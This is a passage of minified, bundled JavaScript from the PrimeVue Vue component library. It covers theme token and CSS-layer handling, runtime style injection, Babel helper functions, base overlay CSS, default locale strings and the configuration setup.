    return this.applyDarkColorScheme(e) ? this.regex.resolve(e.darkModeSelector === !0 ? t.options.darkModeSelector : (r = e.darkModeSelector) != null ? r : t.options.darkModeSelector) : [];
  },
  getLayerOrder(e, t = {}, r, o) {
    const { cssLayer: s } = t;
    return s ? `@layer ${Tt(s.order || "primeui", r)}` : "";
  },
  getCommonStyleSheet({ name: e = "", theme: t = {}, params: r, props: o = {}, set: s, defaults: n }) {
    const i = this.getCommon({ name: e, theme: t, params: r, set: s, defaults: n }), a = Object.entries(o).reduce((l, [u, c]) => l.push(`${u}="${c}"`) && l, []).join(" ");
    return Object.entries(i || {}).reduce((l, [u, c]) => {
      if (c != null && c.css) {
        const p = ir(c == null ? void 0 : c.css), m = `${u}-variables`;
        l.push(`<style type="text/css" data-primevue-style-id="${m}" ${a}>${p}</style>`);
      }
      return l;
    }, []).join("");
  },
  getStyleSheet({ name: e = "", theme: t = {}, params: r, props: o = {}, set: s, defaults: n }) {
    var i;
    const a = { name: e, theme: t, params: r, set: s, defaults: n }, l = (i = e.includes("-directive") ? this.getPresetD(a) : this.getPresetC(a)) == null ? void 0 : i.css, u = Object.entries(o).reduce((c, [p, m]) => c.push(`${p}="${m}"`) && c, []).join(" ");
    return l ? `<style type="text/css" data-primevue-style-id="${e}-variables" ${u}>${ir(l)}</style>` : "";
  },
  createTokens(e = {}, t, r = "", o = "", s = {}) {
    return Object.entries(e).forEach(([n, i]) => {
      const a = at(n, t.variable.excludedKeyRegex) ? r : r ? `${r}.${Fs(n)}` : Fs(n), l = o ? `${o}.${n}` : n;
      Ot(i) ? this.createTokens(i, t, a, l, s) : (s[a] || (s[a] = {
        paths: [],
        computed(u, c = {}) {
          var p, m;
          return this.paths.length === 1 ? (p = this.paths[0]) == null ? void 0 : p.computed(this.paths[0].scheme, c.binding) : u && u !== "none" ? (m = this.paths.find((g) => g.scheme === u)) == null ? void 0 : m.computed(u, c.binding) : this.paths.map((g) => g.computed(g.scheme, c[g.scheme]));
        }
      }), s[a].paths.push({
        path: l,
        value: i,
        scheme: l.includes("colorScheme.light") ? "light" : l.includes("colorScheme.dark") ? "dark" : "none",
        computed(u, c = {}) {
          const p = /{([^}]*)}/g;
          let m = i;
          if (c.name = this.path, c.binding || (c.binding = {}), at(i, p)) {
            const h = i.trim().replaceAll(p, (I) => {
              var R;
              const F = I.replace(/{|}/g, ""), O = (R = s[F]) == null ? void 0 : R.computed(u, c);
              return ga(O) && O.length === 2 ? `light-dark(${O[0].value},${O[1].value})` : O == null ? void 0 : O.value;
            }), b = /(\d+\w*\s+[\+\-\*\/]\s+\d+\w*)/g, C = /var\([^)]+\)/g;
            m = at(h.replace(C, "0"), b) ? `calc(${h})` : h;
          }
          return Zo(c.binding) && delete c.binding, {
            colorScheme: u,
            path: this.path,
            paths: c,
            value: m.includes("undefined") ? void 0 : m
          };
        }
      }));
    }), s;
  },
  getTokenValue(e, t, r) {
    var o;
    const n = ((l) => l.split(".").filter((c) => !at(c.toLowerCase(), r.variable.excludedKeyRegex)).join("."))(t), i = t.includes("colorScheme.light") ? "light" : t.includes("colorScheme.dark") ? "dark" : void 0, a = [(o = e[n]) == null ? void 0 : o.computed(i)].flat().filter((l) => l);
    return a.length === 1 ? a[0].value : a.reduce((l = {}, u) => {
      const c = u, { colorScheme: p } = c, m = tt(c, ["colorScheme"]);
      return l[p] = m, l;
    }, void 0);
  },
  getSelectorRule(e, t, r, o) {
    return r === "class" || r === "attr" ? Nt(ae(t) ? `${e}${t},${e} ${t}` : e, o) : Nt(e, ae(t) ? Nt(t, o) : o);
  },
  transformCSS(e, t, r, o, s = {}, n, i, a) {
    if (ae(t)) {
      const { cssLayer: l } = s;
      if (o !== "style") {
        const u = this.getColorSchemeOption(s, i);
        t = r === "dark" ? u.reduce((c, { type: p, selector: m }) => (ae(m) && (c += m.includes("[CSS]") ? m.replace("[CSS]", t) : this.getSelectorRule(m, a, p, t)), c), "") : Nt(a ?? ":root", t);
      }
      if (l) {
        const u = {
          name: "primeui"
        };
        Ot(l) && (u.name = Tt(l.name, { name: e, type: o })), ae(u.name) && (t = Nt(`@layer ${u.name}`, t), n == null || n.layerNames(u.name));
      }
      return t;
    }
    return "";
  }
}, xe = {
  defaults: {
    variable: {
      prefix: "p",
      selector: ":root",
      excludedKeyRegex: /^(primitive|semantic|components|directives|variables|colorscheme|light|dark|common|root|states|extend|css)$/gi
    },
    options: {
      prefix: "p",
      darkModeSelector: "system",
      cssLayer: !1
    }
  },
  _theme: void 0,
  _layerNames: /* @__PURE__ */ new Set(),
  _loadedStyleNames: /* @__PURE__ */ new Set(),
  _loadingStyles: /* @__PURE__ */ new Set(),
  _tokens: {},
  update(e = {}) {
    const { theme: t } = e;
    t && (this._theme = ho(Fe({}, t), {
      options: Fe(Fe({}, this.defaults.options), t.options)
    }), this._tokens = Ne.createTokens(this.preset, this.defaults), this.clearLoadedStyleNames());
  },
  get theme() {
    return this._theme;
  },
  get preset() {
    var e;
    return ((e = this.theme) == null ? void 0 : e.preset) || {};
  },
  get options() {
    var e;
    return ((e = this.theme) == null ? void 0 : e.options) || {};
  },
  get tokens() {
    return this._tokens;
  },
  getTheme() {
    return this.theme;
  },
  setTheme(e) {
    this.update({ theme: e }), ot.emit("theme:change", e);
  },
  getPreset() {
    return this.preset;
  },
  setPreset(e) {
    this._theme = ho(Fe({}, this.theme), { preset: e }), this._tokens = Ne.createTokens(e, this.defaults), this.clearLoadedStyleNames(), ot.emit("preset:change", e), ot.emit("theme:change", this.theme);
  },
  getOptions() {
    return this.options;
  },
  setOptions(e) {
    this._theme = ho(Fe({}, this.theme), { options: e }), this.clearLoadedStyleNames(), ot.emit("options:change", e), ot.emit("theme:change", this.theme);
  },
  getLayerNames() {
    return [...this._layerNames];
  },
  setLayerNames(e) {
    this._layerNames.add(e);
  },
  getLoadedStyleNames() {
    return this._loadedStyleNames;
  },
  isStyleNameLoaded(e) {
    return this._loadedStyleNames.has(e);
  },
  setLoadedStyleName(e) {
    this._loadedStyleNames.add(e);
  },
  deleteLoadedStyleName(e) {
    this._loadedStyleNames.delete(e);
  },
  clearLoadedStyleNames() {
    this._loadedStyleNames.clear();
  },
  getTokenValue(e) {
    return Ne.getTokenValue(this.tokens, e, this.defaults);
  },
  getCommon(e = "", t) {
    return Ne.getCommon({ name: e, theme: this.theme, params: t, defaults: this.defaults, set: { layerNames: this.setLayerNames.bind(this) } });
  },
  getComponent(e = "", t) {
    const r = { name: e, theme: this.theme, params: t, defaults: this.defaults, set: { layerNames: this.setLayerNames.bind(this) } };
    return Ne.getPresetC(r);
  },
  getDirective(e = "", t) {
    const r = { name: e, theme: this.theme, params: t, defaults: this.defaults, set: { layerNames: this.setLayerNames.bind(this) } };
    return Ne.getPresetD(r);
  },
  getCustomPreset(e = "", t, r, o) {
    const s = { name: e, preset: t, options: this.options, selector: r, params: o, defaults: this.defaults, set: { layerNames: this.setLayerNames.bind(this) } };
    return Ne.getPreset(s);
  },
  getLayerOrderCSS(e = "") {
    return Ne.getLayerOrder(e, this.options, { names: this.getLayerNames() }, this.defaults);
  },
  transformCSS(e = "", t, r = "style", o) {
    return Ne.transformCSS(e, t, o, r, this.options, { layerNames: this.setLayerNames.bind(this) }, this.defaults);
  },
  getCommonStyleSheet(e = "", t, r = {}) {
    return Ne.getCommonStyleSheet({ name: e, theme: this.theme, params: t, props: r, defaults: this.defaults, set: { layerNames: this.setLayerNames.bind(this) } });
  },
  getStyleSheet(e, t, r = {}) {
    return Ne.getStyleSheet({ name: e, theme: this.theme, params: t, props: r, defaults: this.defaults, set: { layerNames: this.setLayerNames.bind(this) } });
  },
  onStyleMounted(e) {
    this._loadingStyles.add(e);
  },
  onStyleUpdated(e) {
    this._loadingStyles.add(e);
  },
  onStyleLoaded(e, { name: t }) {
    this._loadingStyles.size && (this._loadingStyles.delete(t), ot.emit(`theme:${t}:load`, e), !this._loadingStyles.size && ot.emit("theme:load"));
  }
};
function _a(e) {
  return typeof HTMLElement == "object" ? e instanceof HTMLElement : e && typeof e == "object" && e !== null && e.nodeType === 1 && typeof e.nodeName == "string";
}
function Io(e, t = {}) {
  if (_a(e)) {
    const r = (o, s) => {
      var n, i;
      const a = (n = e == null ? void 0 : e.$attrs) != null && n[o] ? [(i = e == null ? void 0 : e.$attrs) == null ? void 0 : i[o]] : [];
      return [s].flat().reduce((l, u) => {
        if (u != null) {
          const c = typeof u;
          if (c === "string" || c === "number")
            l.push(u);
          else if (c === "object") {
            const p = Array.isArray(u) ? r(o, u) : Object.entries(u).map(([m, g]) => o === "style" && (g || g === 0) ? `${m.replace(/([a-z])([A-Z])/g, "$1-$2").toLowerCase()}:${g}` : g ? m : void 0);
            l = p.length ? l.concat(p.filter((m) => !!m)) : l;
          }
        }
        return l;
      }, a);
    };
    Object.entries(t).forEach(([o, s]) => {
      if (s != null) {
        const n = o.match(/^on(.+)/);
        n ? e.addEventListener(n[1].toLowerCase(), s) : o === "p-bind" ? Io(e, s) : (s = o === "class" ? [...new Set(r("class", s))].join(" ").trim() : o === "style" ? r("style", s).join(";").trim() : s, (e.$attrs = e.$attrs || {}) && (e.$attrs[o] = s), e.setAttribute(o, s));
      }
    });
  }
}
function kc(e) {
  if (e) {
    let t = e.parentNode;
    return t && t instanceof ShadowRoot && t.host && (t = t.host), t;
  }
  return null;
}
function wc(e) {
  return !!(e !== null && typeof e < "u" && e.nodeName && kc(e));
}
function _c() {
  return !!(typeof window < "u" && window.document && window.document.createElement);
}
function Sc(e, t = "", r) {
  _a(e) && r !== null && r !== void 0 && e.setAttribute(t, r);
}
var he = {
  STARTS_WITH: "startsWith",
  CONTAINS: "contains",
  NOT_CONTAINS: "notContains",
  ENDS_WITH: "endsWith",
  EQUALS: "equals",
  NOT_EQUALS: "notEquals",
  LESS_THAN: "lt",
  LESS_THAN_OR_EQUAL_TO: "lte",
  GREATER_THAN: "gt",
  GREATER_THAN_OR_EQUAL_TO: "gte",
  DATE_IS: "dateIs",
  DATE_IS_NOT: "dateIsNot",
  DATE_BEFORE: "dateBefore",
  DATE_AFTER: "dateAfter"
};
function br(e) {
  "@babel/helpers - typeof";
  return br = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(t) {
    return typeof t;
  } : function(t) {
    return t && typeof Symbol == "function" && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
  }, br(e);
}
function Ks(e, t) {
  var r = Object.keys(e);
  if (Object.getOwnPropertySymbols) {
    var o = Object.getOwnPropertySymbols(e);
    t && (o = o.filter(function(s) {
      return Object.getOwnPropertyDescriptor(e, s).enumerable;
    })), r.push.apply(r, o);
  }
  return r;
}
function Hs(e) {
  for (var t = 1; t < arguments.length; t++) {
    var r = arguments[t] != null ? arguments[t] : {};
    t % 2 ? Ks(Object(r), !0).forEach(function(o) {
      Cc(e, o, r[o]);
    }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : Ks(Object(r)).forEach(function(o) {
      Object.defineProperty(e, o, Object.getOwnPropertyDescriptor(r, o));
    });
  }
  return e;
}
function Cc(e, t, r) {
  return (t = jc(t)) in e ? Object.defineProperty(e, t, { value: r, enumerable: !0, configurable: !0, writable: !0 }) : e[t] = r, e;
}
function jc(e) {
  var t = Tc(e, "string");
  return br(t) == "symbol" ? t : t + "";
}
function Tc(e, t) {
  if (br(e) != "object" || !e) return e;
  var r = e[Symbol.toPrimitive];
  if (r !== void 0) {
    var o = r.call(e, t);
    if (br(o) != "object") return o;
    throw new TypeError("@@toPrimitive must return a primitive value.");
  }
  return (t === "string" ? String : Number)(e);
}
function $c(e) {
  var t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !0;
  Qo() ? Nn(e) : t ? e() : Jo(e);
}
var Pc = 0;
function Oc(e) {
  var t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {}, r = ue(!1), o = ue(e), s = ue(null), n = _c() ? window.document : void 0, i = t.document, a = i === void 0 ? n : i, l = t.immediate, u = l === void 0 ? !0 : l, c = t.manual, p = c === void 0 ? !1 : c, m = t.name, g = m === void 0 ? "style_".concat(++Pc) : m, h = t.id, b = h === void 0 ? void 0 : h, C = t.media, I = C === void 0 ? void 0 : C, R = t.nonce, F = R === void 0 ? void 0 : R, O = t.first, B = O === void 0 ? !1 : O, q = t.onMounted, ee = q === void 0 ? void 0 : q, K = t.onUpdated, W = K === void 0 ? void 0 : K, Q = t.onLoad, ie = Q === void 0 ? void 0 : Q, de = t.props, ge = de === void 0 ? {} : de, Se = function() {
  }, Ie = function(U) {
    var Ce = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    if (a) {
      var je = Hs(Hs({}, ge), Ce), fe = je.name || g, pe = je.id || b, yt = je.nonce || F;
      s.value = a.querySelector('style[data-primevue-style-id="'.concat(fe, '"]')) || a.getElementById(pe) || a.createElement("style"), s.value.isConnected || (o.value = U || e, Io(s.value, {
        type: "text/css",
        id: pe,
        media: I,
        nonce: yt
      }), B ? a.head.prepend(s.value) : a.head.appendChild(s.value), Sc(s.value, "data-primevue-style-id", fe), Io(s.value, je), s.value.onload = function(ut) {
        return ie == null ? void 0 : ie(ut, {
          name: fe
        });
      }, ee == null || ee(fe)), !r.value && (Se = Ye(o, function(ut) {
        s.value.textContent = ut, W == null || W(fe);
      }, {
        immediate: !0
      }), r.value = !0);
    }
  }, Z = function() {
    !a || !r.value || (Se(), wc(s.value) && a.head.removeChild(s.value), r.value = !1);
  };
  return u && !p && $c(Ie), {
    id: b,
    name: g,
    el: s,
    css: o,
    unload: Z,
    load: Ie,
    isLoaded: Ir(r)
  };
}
function gr(e) {
  "@babel/helpers - typeof";
  return gr = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(t) {
    return typeof t;
  } : function(t) {
    return t && typeof Symbol == "function" && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
  }, gr(e);
}
function Ws(e, t) {
  return zc(e) || Ic(e, t) || Ec(e, t) || Ac();
}
function Ac() {
  throw new TypeError(`Invalid attempt to destructure non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`);
}
function Ec(e, t) {
  if (e) {
    if (typeof e == "string") return Js(e, t);
    var r = {}.toString.call(e).slice(8, -1);
    return r === "Object" && e.constructor && (r = e.constructor.name), r === "Map" || r === "Set" ? Array.from(e) : r === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r) ? Js(e, t) : void 0;
  }
}
function Js(e, t) {
  (t == null || t > e.length) && (t = e.length);
  for (var r = 0, o = Array(t); r < t; r++) o[r] = e[r];
  return o;
}
function Ic(e, t) {
  var r = e == null ? null : typeof Symbol < "u" && e[Symbol.iterator] || e["@@iterator"];
  if (r != null) {
    var o, s, n, i, a = [], l = !0, u = !1;
    try {
      if (n = (r = r.call(e)).next, t !== 0) for (; !(l = (o = n.call(r)).done) && (a.push(o.value), a.length !== t); l = !0) ;
    } catch (c) {
      u = !0, s = c;
    } finally {
      try {
        if (!l && r.return != null && (i = r.return(), Object(i) !== i)) return;
      } finally {
        if (u) throw s;
      }
    }
    return a;
  }
}
function zc(e) {
  if (Array.isArray(e)) return e;
}
function Us(e, t) {
  var r = Object.keys(e);
  if (Object.getOwnPropertySymbols) {
    var o = Object.getOwnPropertySymbols(e);
    t && (o = o.filter(function(s) {
      return Object.getOwnPropertyDescriptor(e, s).enumerable;
    })), r.push.apply(r, o);
  }
  return r;
}
function mo(e) {
  for (var t = 1; t < arguments.length; t++) {
    var r = arguments[t] != null ? arguments[t] : {};
    t % 2 ? Us(Object(r), !0).forEach(function(o) {
      Rc(e, o, r[o]);
    }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : Us(Object(r)).forEach(function(o) {
      Object.defineProperty(e, o, Object.getOwnPropertyDescriptor(r, o));
    });
  }
  return e;
}
function Rc(e, t, r) {
  return (t = Lc(t)) in e ? Object.defineProperty(e, t, { value: r, enumerable: !0, configurable: !0, writable: !0 }) : e[t] = r, e;
}
function Lc(e) {
  var t = Nc(e, "string");
  return gr(t) == "symbol" ? t : t + "";
}
function Nc(e, t) {
  if (gr(e) != "object" || !e) return e;
  var r = e[Symbol.toPrimitive];
  if (r !== void 0) {
    var o = r.call(e, t);
    if (gr(o) != "object") return o;
    throw new TypeError("@@toPrimitive must return a primitive value.");
  }
  return (t === "string" ? String : Number)(e);
}
var Mc = function(t) {
  var r = t.dt;
  return `
* {
    box-sizing: border-box;
}

/* Non vue overlay animations */
.p-connected-overlay {
    opacity: 0;
    transform: scaleY(0.8);
    transition: transform 0.12s cubic-bezier(0, 0, 0.2, 1),
        opacity 0.12s cubic-bezier(0, 0, 0.2, 1);
}

.p-connected-overlay-visible {
    opacity: 1;
    transform: scaleY(1);
}

.p-connected-overlay-hidden {
    opacity: 0;
    transform: scaleY(1);
    transition: opacity 0.1s linear;
}

/* Vue based overlay animations */
.p-connected-overlay-enter-from {
    opacity: 0;
    transform: scaleY(0.8);
}

.p-connected-overlay-leave-to {
    opacity: 0;
}

.p-connected-overlay-enter-active {
    transition: transform 0.12s cubic-bezier(0, 0, 0.2, 1),
        opacity 0.12s cubic-bezier(0, 0, 0.2, 1);
}

.p-connected-overlay-leave-active {
    transition: opacity 0.1s linear;
}

/* Toggleable Content */
.p-toggleable-content-enter-from,
.p-toggleable-content-leave-to {
    max-height: 0;
}

.p-toggleable-content-enter-to,
.p-toggleable-content-leave-from {
    max-height: 1000px;
}

.p-toggleable-content-leave-active {
    overflow: hidden;
    transition: max-height 0.45s cubic-bezier(0, 1, 0, 1);
}

.p-toggleable-content-enter-active {
    overflow: hidden;
    transition: max-height 1s ease-in-out;
}

.p-disabled,
.p-disabled * {
    cursor: default;
    pointer-events: none;
    user-select: none;
}

.p-disabled,
.p-component:disabled {
    opacity: `.concat(r("disabled.opacity"), `;
}

.pi {
    font-size: `).concat(r("icon.size"), `;
}

.p-icon {
    width: `).concat(r("icon.size"), `;
    height: `).concat(r("icon.size"), `;
}

.p-overlay-mask {
    background: `).concat(r("mask.background"), `;
    color: `).concat(r("mask.color"), `;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}

.p-overlay-mask-enter {
    animation: p-overlay-mask-enter-animation `).concat(r("mask.transition.duration"), ` forwards;
}

.p-overlay-mask-leave {
    animation: p-overlay-mask-leave-animation `).concat(r("mask.transition.duration"), ` forwards;
}

@keyframes p-overlay-mask-enter-animation {
    from {
        background: transparent;
    }
    to {
        background: `).concat(r("mask.background"), `;
    }
}
@keyframes p-overlay-mask-leave-animation {
    from {
        background: `).concat(r("mask.background"), `;
    }
    to {
        background: transparent;
    }
}
`);
}, Fc = function(t) {
  var r = t.dt;
  return `
.p-hidden-accessible {
    border: 0;
    clip: rect(0 0 0 0);
    height: 1px;
    margin: -1px;
    overflow: hidden;
    padding: 0;
    position: absolute;
    width: 1px;
}

.p-hidden-accessible input,
.p-hidden-accessible select {
    transform: scale(0);
}

.p-overflow-hidden {
    overflow: hidden;
    padding-right: `.concat(r("scrollbar.width"), `;
}
`);
}, Dc = {}, Vc = {}, Rt = {
  name: "base",
  css: Fc,
  theme: Mc,
  classes: Dc,
  inlineStyles: Vc,
  load: function(t) {
    var r = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {}, o = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : function(n) {
      return n;
    }, s = o(Tt(t, {
      dt: lr
    }));
    return ae(s) ? Oc(ir(s), mo({
      name: this.name
    }, r)) : {};
  },
  loadCSS: function() {
    var t = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
    return this.load(this.css, t);
  },
  loadTheme: function() {
    var t = this, r = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}, o = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "";
    return this.load(this.theme, r, function() {
      var s = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "";
      return xe.transformCSS(r.name || t.name, "".concat(s).concat(o));
    });
  },
  getCommonTheme: function(t) {
    return xe.getCommon(this.name, t);
  },
  getComponentTheme: function(t) {
    return xe.getComponent(this.name, t);
  },
  getDirectiveTheme: function(t) {
    return xe.getDirective(this.name, t);
  },
  getPresetTheme: function(t, r, o) {
    return xe.getCustomPreset(this.name, t, r, o);
  },
  getLayerOrderThemeCSS: function() {
    return xe.getLayerOrderCSS(this.name);
  },
  getStyleSheet: function() {
    var t = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "", r = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    if (this.css) {
      var o = Tt(this.css, {
        dt: lr
      }) || "", s = ir("".concat(o).concat(t)), n = Object.entries(r).reduce(function(i, a) {
        var l = Ws(a, 2), u = l[0], c = l[1];
        return i.push("".concat(u, '="').concat(c, '"')) && i;
      }, []).join(" ");
      return ae(s) ? '<style type="text/css" data-primevue-style-id="'.concat(this.name, '" ').concat(n, ">").concat(s, "</style>") : "";
    }
    return "";
  },
  getCommonThemeStyleSheet: function(t) {
    var r = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    return xe.getCommonStyleSheet(this.name, t, r);
  },
  getThemeStyleSheet: function(t) {
    var r = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {}, o = [xe.getStyleSheet(this.name, t, r)];
    if (this.theme) {
      var s = this.name === "base" ? "global-style" : "".concat(this.name, "-style"), n = Tt(this.theme, {
        dt: lr
      }), i = ir(xe.transformCSS(s, n)), a = Object.entries(r).reduce(function(l, u) {
        var c = Ws(u, 2), p = c[0], m = c[1];
        return l.push("".concat(p, '="').concat(m, '"')) && l;
      }, []).join(" ");
      ae(i) && o.push('<style type="text/css" data-primevue-style-id="'.concat(s, '" ').concat(a, ">").concat(i, "</style>"));
    }
    return o.join("");
  },
  extend: function(t) {
    return mo(mo({}, this), {}, {
      css: void 0,
      theme: void 0
    }, t);
  }
}, Tr = xa();
function hr(e) {
  "@babel/helpers - typeof";
  return hr = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(t) {
    return typeof t;
  } : function(t) {
    return t && typeof Symbol == "function" && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
  }, hr(e);
}
function Gs(e, t) {
  var r = Object.keys(e);
  if (Object.getOwnPropertySymbols) {
    var o = Object.getOwnPropertySymbols(e);
    t && (o = o.filter(function(s) {
      return Object.getOwnPropertyDescriptor(e, s).enumerable;
    })), r.push.apply(r, o);
  }
  return r;
}
function $r(e) {
  for (var t = 1; t < arguments.length; t++) {
    var r = arguments[t] != null ? arguments[t] : {};
    t % 2 ? Gs(Object(r), !0).forEach(function(o) {
      Bc(e, o, r[o]);
    }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : Gs(Object(r)).forEach(function(o) {
      Object.defineProperty(e, o, Object.getOwnPropertyDescriptor(r, o));
    });
  }
  return e;
}
function Bc(e, t, r) {
  return (t = Kc(t)) in e ? Object.defineProperty(e, t, { value: r, enumerable: !0, configurable: !0, writable: !0 }) : e[t] = r, e;
}
function Kc(e) {
  var t = Hc(e, "string");
  return hr(t) == "symbol" ? t : t + "";
}
function Hc(e, t) {
  if (hr(e) != "object" || !e) return e;
  var r = e[Symbol.toPrimitive];
  if (r !== void 0) {
    var o = r.call(e, t);
    if (hr(o) != "object") return o;
    throw new TypeError("@@toPrimitive must return a primitive value.");
  }
  return (t === "string" ? String : Number)(e);
}
var Wc = {
  ripple: !1,
  inputStyle: null,
  inputVariant: null,
  locale: {
    startsWith: "Starts with",
    contains: "Contains",
    notContains: "Not contains",
    endsWith: "Ends with",
    equals: "Equals",
    notEquals: "Not equals",
    noFilter: "No Filter",
    lt: "Less than",
    lte: "Less than or equal to",
    gt: "Greater than",
    gte: "Greater than or equal to",
    dateIs: "Date is",
    dateIsNot: "Date is not",
    dateBefore: "Date is before",
    dateAfter: "Date is after",
    clear: "Clear",
    apply: "Apply",
    matchAll: "Match All",
    matchAny: "Match Any",
    addRule: "Add Rule",
    removeRule: "Remove Rule",
    accept: "Yes",
    reject: "No",
    choose: "Choose",
    upload: "Upload",
    cancel: "Cancel",
    completed: "Completed",
    pending: "Pending",
    fileSizeTypes: ["B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"],
    dayNames: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
    dayNamesShort: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"],
    dayNamesMin: ["Su", "Mo", "Tu", "We", "Th", "Fr", "Sa"],
    monthNames: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
    monthNamesShort: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
    chooseYear: "Choose Year",
    chooseMonth: "Choose Month",
    chooseDate: "Choose Date",
    prevDecade: "Previous Decade",
    nextDecade: "Next Decade",
    prevYear: "Previous Year",
    nextYear: "Next Year",
    prevMonth: "Previous Month",
    nextMonth: "Next Month",
    prevHour: "Previous Hour",
    nextHour: "Next Hour",
    prevMinute: "Previous Minute",
    nextMinute: "Next Minute",
    prevSecond: "Previous Second",
    nextSecond: "Next Second",
    am: "am",
    pm: "pm",
    today: "Today",
    weekHeader: "Wk",
    firstDayOfWeek: 0,
    showMonthAfterYear: !1,
    dateFormat: "mm/dd/yy",
    weak: "Weak",
    medium: "Medium",
    strong: "Strong",
    passwordPrompt: "Enter a password",
    emptyFilterMessage: "No results found",
    searchMessage: "{0} results are available",
    selectionMessage: "{0} items selected",
    emptySelectionMessage: "No selected item",
    emptySearchMessage: "No results found",
    fileChosenMessage: "{0} files",
    noFileChosenMessage: "No file chosen",
    emptyMessage: "No available options",
    aria: {
      trueLabel: "True",
      falseLabel: "False",
      nullLabel: "Not Selected",
      star: "1 star",
      stars: "{star} stars",
      selectAll: "All items selected",
      unselectAll: "All items unselected",
      close: "Close",
      previous: "Previous",
      next: "Next",
      navigation: "Navigation",
      scrollTop: "Scroll Top",
      moveTop: "Move Top",
      moveUp: "Move Up",
      moveDown: "Move Down",
      moveBottom: "Move Bottom",
      moveToTarget: "Move to Target",
      moveToSource: "Move to Source",
      moveAllToTarget: "Move All to Target",
      moveAllToSource: "Move All to Source",
      pageLabel: "Page {page}",
      firstPageLabel: "First Page",
      lastPageLabel: "Last Page",
      nextPageLabel: "Next Page",
      prevPageLabel: "Previous Page",
      rowsPerPageLabel: "Rows per page",
      jumpToPageDropdownLabel: "Jump to Page Dropdown",
      jumpToPageInputLabel: "Jump to Page Input",
      selectRow: "Row Selected",
      unselectRow: "Row Unselected",
      expandRow: "Row Expanded",
      collapseRow: "Row Collapsed",
      showFilterMenu: "Show Filter Menu",
      hideFilterMenu: "Hide Filter Menu",
      filterOperator: "Filter Operator",
      filterConstraint: "Filter Constraint",
      editRow: "Row Edit",
      saveEdit: "Save Edit",
      cancelEdit: "Cancel Edit",
      listView: "List View",
      gridView: "Grid View",
      slide: "Slide",
      slideNumber: "{slideNumber}",
      zoomImage: "Zoom Image",
      zoomIn: "Zoom In",
      zoomOut: "Zoom Out",
      rotateRight: "Rotate Right",
      rotateLeft: "Rotate Left",
      listLabel: "Option List"
    }
  },
  filterMatchModeOptions: {
    text: [he.STARTS_WITH, he.CONTAINS, he.NOT_CONTAINS, he.ENDS_WITH, he.EQUALS, he.NOT_EQUALS],
    numeric: [he.EQUALS, he.NOT_EQUALS, he.LESS_THAN, he.LESS_THAN_OR_EQUAL_TO, he.GREATER_THAN, he.GREATER_THAN_OR_EQUAL_TO],
    date: [he.DATE_IS, he.DATE_IS_NOT, he.DATE_BEFORE, he.DATE_AFTER]
  },
  zIndex: {
    modal: 1100,
    overlay: 1e3,
    menu: 1e3,
    tooltip: 1100
  },
  theme: void 0,
  unstyled: !1,
  pt: void 0,
  ptOptions: {
    mergeSections: !0,
    mergeProps: !1
  },
  csp: {
    nonce: void 0
  }
}, Jc = Symbol();
function Uc(e, t) {
  var r = {
    config: Wt(t)
  };
  return e.config.globalProperties.$primevue = r, e.provide(Jc, r), Gc(), qc(e, r), r;
}
var Mt = [];
function Gc() {
  ot.clear(), Mt.forEach(function(e) {
    return e == null ? void 0 : e();
  }), Mt = [];
}
function qc(e, t) {
  var r = ue(!1), o = function() {
    var u;
    if (((u = t.config) === null || u === void 0 ? void 0 : u.theme) !== "none" && !xe.isStyleNameLoaded("common")) {
      var c, p, m = ((c = Rt.getCommonTheme) === null || c === void 0 ? void 0 : c.call(Rt)) || {}, g = m.primitive, h = m.semantic, b = m.global, C = m.style, I = {
        nonce: (p = t.config) === null || p === void 0 || (p = p.csp) === null || p === void 0 ? void 0 : p.nonce
      };
      Rt.load(g == null ? void 0 : g.css, $r({
        name: "primitive-variables"
      }, I)), Rt.load(h == null ? void 0 : h.css, $r({
        name: "semantic-variables"
      }, I)), Rt.load(b == null ? void 0 : b.css, $r({
        name: "global-variables"
      }, I)), Rt.loadTheme($r({
        name: "global-style"
      }, I), C), xe.setLoadedStyleName("common");
    }
  };
  ot.on("theme:change", function(l) {
    r.value || (e.config.globalProperties.$primevue.config.theme = l, r.value = !0);
  });
  var s = Ye(t.config, function(l, u) {
    Tr.emit("config:change", {
      newValue: l,
      oldValue: u
    });
  }, {
    immediate: !0,
    deep: !0
  }), n = Ye(function() {
    return t.config.ripple;
  }, function(l, u) {
    Tr.emit("config:ripple:change", {
      newValue: l,
      oldValue: u
    });
  }, {
    immediate: !0,
    deep: !0
  }), i = Ye(function() {
    return t.config.theme;
  }, function(l, u) {
